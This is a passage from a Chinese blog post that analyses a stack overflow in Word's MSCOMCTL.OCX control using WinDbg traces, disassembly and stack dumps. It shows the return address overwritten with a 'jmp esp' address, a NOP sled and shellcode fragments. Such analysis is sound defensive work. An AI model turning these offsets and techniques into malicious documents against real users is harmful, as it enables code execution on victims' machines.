&lt;p&gt;确定确实是 MSCOMCTL.OCX 控件出的问题。接下来就是在 &lt;code&gt;winword+0x1ecdca&lt;/code&gt; 处下断点，跟进：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;0:000&amp;gt; p&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;eax=08e28bf0 ebx=09581fa4 ecx=275a3540 edx=00000000 esi=00000000 edi=09581fbc&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;eip=27600905 esp=00121808 ebp=00121814 iopl=0         nv up ei pl nz ac pe cy&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000217&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;MSCOMCTL!DllUnregisterServer+0xc2e:&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;27600905 ff5114          call    dword ptr [ecx+14h]  ds:0023:275a3554=275b66de&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;0:000&amp;gt; p&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Breakpoint 1 hit&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;eax=00000000 ebx=0a0a0810 ecx=7c93003d edx=00140608 esi=08e2beac edi=00000000&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;eip=7c86467b esp=00121718 ebp=00000000 iopl=0         nv up ei pl zr na pe nc&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;kernel32!UnhandledExceptionFilter+0x7fc:&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7c86467b ffe4            jmp     esp &amp;#123;&amp;lt;Unloaded_dui.DLL&amp;gt;+0x1216f7 (00121718)&amp;#125;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;继续跟进：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;······ 省略中间跟进过程 ······&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;0:000&amp;gt; p&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;eax=00000000 ebx=0a5f0810 ecx=7c93003d edx=00140608 esi=00186ad4 edi=00000000&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;eip=275c8a56 esp=0012170c ebp=00000000 iopl=0         nv up ei pl zr na pe nc&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;MSCOMCTL!DllGetClassObject+0x41d12:&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;275c8a56 c20800          ret     8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;0:000&amp;gt; p&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Breakpoint 1 hit&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;eax=00000000 ebx=0a5f0810 ecx=7c93003d edx=00140608 esi=00186ad4 edi=00000000&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;eip=7c86467b esp=00121718 ebp=00000000 iopl=0         nv up ei pl zr na pe nc&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;kernel32!UnhandledExceptionFilter+0x7fc:&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7c86467b ffe4            jmp     esp &amp;#123;&amp;lt;Unloaded_dui.DLL&amp;gt;+0x1216d7 (00121718)&amp;#125;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;最后的函数调用关系如下：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;17&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;18&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;19&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;0:000&amp;gt; kb&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;ChildEBP RetAddr  Args to Child              &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;WARNING: Stack unwind information not available. Following frames may be wrong.&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00121708 275e701a 08d97aa4 0a0a0810 00000000 MSCOMCTL!DllGetClassObject+0x41c89&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00121730 275e7361 08d97aa4 0a0a0810 0a0a0810 MSCOMCTL!DLLGetDocumentation+0xd08&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00121750 275ca8b6 08d969d0 0a0a0810 08d96828 MSCOMCTL!DLLGetDocumentation+0x104f&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;001217d0 2758aee8 08d967d8 00000000 0a0a0810 MSCOMCTL!DllGetClassObject+0x43b72&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00121800 27600908 08d96828 0a0a0810 00000000 MSCOMCTL!DllGetClassObject+0x41a4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00121814 301ecdcd 08d9682c 0a0a0810 00000000 MSCOMCTL!DllUnregisterServer+0xc31&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;001218a8 3032463c 00000000 00000000 09581fa4 winword+0x1ecdcd&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;001218fc 3046c59c 00000000 00000000 00000001 winword!wdCommandDispatch+0x44983&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00121974 302d90c1 00000001 00000000 00000000 winword!wdCommandDispatch+0x18c8e3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00121a38 300424d3 09580a0c 00000002 00121e08 winword+0x2d90c1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00121e6c 7c98d144 7c969564 00140000 0000001e winword+0x424d3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00121f8c 30cc67f6 3160ff00 00aabe1a 00aabd1a ntdll!RtlDebugAllocateHeap+0x281&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00121fa8 30cc64e5 00aafffc 00000008 3160ff00 mso!_MsoPvFree+0x129&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00121fd0 30cc641e 30cc6431 3160ff00 0000001a mso!Ordinal573+0xff&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00122010 300086e1 00000004 00aabd04 00000000 mso!Ordinal573+0x38&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00000000 00000000 00000000 00000000 00000000 winword+0x86e1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&quot;分析漏洞&quot;&gt;&lt;a href=&quot;#分析漏洞&quot; class=&quot;headerlink&quot; title=&quot;分析漏洞&quot;&gt;&lt;/a&gt;分析漏洞&lt;/h2&gt;&lt;p&gt;具体跟进下 &lt;code&gt;MSCOMCTL!DllGetClassObject+0x41c83&lt;/code&gt;，这时将 WinDbg 的 Memory 窗口锁定在 &lt;code&gt;0x12170c&lt;/code&gt;，观察具体是走到哪一步造成的溢出：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;17&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;18&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;19&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;20&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;21&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;22&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;23&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;24&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;25&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;26&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;27&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;28&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;29&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;30&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;31&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;32&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;33&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;34&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;275c89c7 55              push    ebp&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;275c89c8 8bec            mov     ebp,esp&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;;注意只开辟了 0x14 的栈空间&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;275c89ca 83ec14          sub     esp,14h&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;275c89cd 53              push    ebx&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;275c89ce 8b5d0c          mov     ebx,dword ptr [ebp+0Ch]&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;275c89d1 56              push    esi&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;275c89d2 57              push    edi&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;275c89d3 6a0c            push    0Ch&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;275c89d5 8d45ec          lea     eax,[ebp-14h]&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;275c89d8 53              push    ebx&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;275c89d9 50              push    eax&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;;第一次调用 MSCOMCTL!DllGetClassObject+0x41a29&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;275c89da e88efdffff      call    MSCOMCTL!DllGetClassObject+0x41a29 (275c876d)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;275c89df 83c40c          add     esp,0Ch&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;275c89e2 85c0            test    eax,eax&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;275c89e4 7c6c            jl      MSCOMCTL!DllGetClassObject+0x41d0e (275c8a52)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;275c89e6 817dec436f626a  cmp     dword ptr [ebp-14h],6A626F43h&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;275c89ed 0f8592a60000    jne     MSCOMCTL!DllGetClassObject+0x4c341 (275d3085)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;275c89f3 837df408        cmp     dword ptr [ebp-0Ch],8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;;就是这个比较导致了漏洞，jb：小于跳转，应为大于跳转&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;275c89f7 0f8288a60000    jb      MSCOMCTL!DllGetClassObject+0x4c341 (275d3085)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;275c89fd ff75f4          push    dword ptr [ebp-0Ch]&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;275c8a00 8d45f8          lea     eax,[ebp-8]&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;275c8a03 53              push    ebx&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;275c8a04 50              push    eax&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;;第二次调用 MSCOMCTL!DllGetClassObject+0x41a29，导致了栈溢出&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;275c8a05 e863fdffff      call    MSCOMCTL!DllGetClassObject+0x41a29 (275c876d)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;275c8a0a 8bf0            mov     esi,eax&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;······ 省略中间指令 ······&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;275c8a53 5e              pop     esi&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;275c8a54 5b              pop     ebx&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;275c8a55 c9              leave&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;275c8a56 c20800          ret     8&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;调用了两次 &lt;code&gt;MSCOMCTL!DllGetClassObject+0x41a29&lt;/code&gt;，第二次调用时造成了栈溢出。第二次调用时入栈的三个参数如下：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;0:000&amp;gt; dd esp L3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;001216dc  00121700 0a130810 00008282&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;第一个参数指向栈内，第二个参数指向一片内存区域，第三个参数为大小（由后面分析得知）。接下来跟进下 &lt;code&gt;MSCOMCTL!DllGetClassObject+0x41a29&lt;/code&gt;，注意继续观察 &lt;code&gt;0x12170c&lt;/code&gt; 处的内存变化：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;17&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;······ 省略中间指令 ······&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;;参数拷入 edi&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;275c878a 8b7d10          mov     edi,dword ptr [ebp+10h]&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;;edi=00008282&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;275c878d 397dfc          cmp     dword ptr [ebp-4],edi&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;275c8790 0f85fdb70000    jne     MSCOMCTL!DllGetClassObject+0x4d24f (275d3f93)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;······ 省略中间指令 ······&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;275c87c6 8bc1            mov     eax,ecx&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;275c87c8 c1e902          shr     ecx,2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;;memcpy，造成溢出&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;275c87cb f3a5            rep movs dword ptr es:[edi],dword ptr [esi]&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;275c87cd 8bc8            mov     ecx,eax&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;275c87cf 8b4510          mov     eax,dword ptr [ebp+10h]&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;275c87d2 83e103          and     ecx,3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;275c87d5 6a00            push    0&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;275c87d7 8d5003          lea     edx,[eax+3]&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;275c87da 83e2fc          and     edx,0FFFFFFFCh&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;观察溢出前后栈数据的变化：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;17&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;18&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;19&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;20&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;21&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;22&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;23&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;24&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;25&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;26&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;27&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;;溢出前&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;0:000&amp;gt; db esp&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;001216c4  00 00 00 00 84 be d9 08-10 08 0a 0a 82 82 00 00  ................&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;001216d4  08 17 12 00 0a 8a 5c 27-00 17 12 00 08 70 dc 08  ......\&amp;apos;.....p..&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;001216e4  82 82 00 00 00 00 00 00-84 be d9 08 10 08 0a 0a  ................&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;001216f4  43 6f 62 6a 64 00 00 00-82 82 00 00 70 bf d9 08  Cobjd.......p...&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00121704  e4 59 58 27 30 17 12 00-1a 70 5e 27 84 be d9 08  .YX&amp;apos;0....p^&amp;apos;....&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00121714  10 08 0a 0a 00 00 00 00-60 be d9 08 28 8b d9 08  ........`...(...&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00121724  96 c2 5a 27 01 00 00 00-50 17 12 00 50 17 12 00  ..Z&amp;apos;....P...P...&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00121734  61 73 5e 27 84 be d9 08-10 08 0a 0a 10 08 0a 0a  as^&amp;apos;............&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;;rep movs dword ptr es:[edi],dword ptr [esi] =&amp;gt; memcpy 造成溢出&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;0:000&amp;gt; p&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;eax=00008282 ebx=0a0a0810 ecx=00000000 edx=00000000 esi=08dcf288 edi=00129980&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;eip=275c87cd esp=001216c4 ebp=001216d4 iopl=0         nv up ei pl nz na pe cy&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000207&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;MSCOMCTL!DllGetClassObject+0x41a89:&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;275c87cd 8bc8            mov     ecx,eax&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;;溢出后&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;0:000&amp;gt; db esp&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;001216c4  00 00 00 00 84 be d9 08-10 08 0a 0a 82 82 00 00  ................&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;001216d4  08 17 12 00 0a 8a 5c 27-00 17 12 00 08 70 dc 08  ......\&amp;apos;.....p..&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;001216e4  82 82 00 00 00 00 00 00-84 be d9 08 10 08 0a 0a  ................&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;001216f4  43 6f 62 6a 64 00 00 00-82 82 00 00 00 00 00 00  Cobjd...........&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00121704  00 00 00 00 00 00 00 00-7b 46 86 7c 90 90 90 90  ........&amp;#123;F.|....&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00121714  90 90 90 90 3f 99 49 98-48 93 46 41 97 4f 97 90  ....?.I.H.FA.O..&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00121724  97 97 48 97 97 96 96 fd-99 40 41 47 f8 d6 f9 96  ..H......@AG....&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00121734  f8 99 d6 98 fd f8 97 fd-f5 49 48 f9 40 48 3f 42  .........IH.@H?B&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;可见 shellcode 已经被拷入栈中，并且上层函数返回地址已经被 0x7c86467b（&lt;code&gt;jmp esp&lt;/code&gt;）覆盖：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;;在上层函数栈桢中观察&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;0:000&amp;gt; kb&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;ChildEBP RetAddr  Args to Child              &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;WARNING: Stack unwind information not available. Following frames may be wrong.&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00121708 7c86467b 90909090 90909090 9849993f MSCOMCTL!DllGetClassObject+0x41cc6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;0012196c 00000000 00000000 00000000 00000000 kernel32!UnhandledExceptionFilter+0x7fc&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;函数 &lt;code&gt;MSCOMCTL!DllGetClassObject+0x41c83&lt;/code&gt; 开辟了 0x14 的栈桢，其中两次调用 &lt;code&gt;MSCOMCTL!DllGetClassObject+0x41a29&lt;/code&gt;。第二次调用前进行了判断，本应该是小于等于却被写成了大于等于，结果拷入了 0x8282 字节的数据，破坏了上层函数的栈桢，覆盖返回地址，造成代码执行漏洞。&lt;/p&gt;
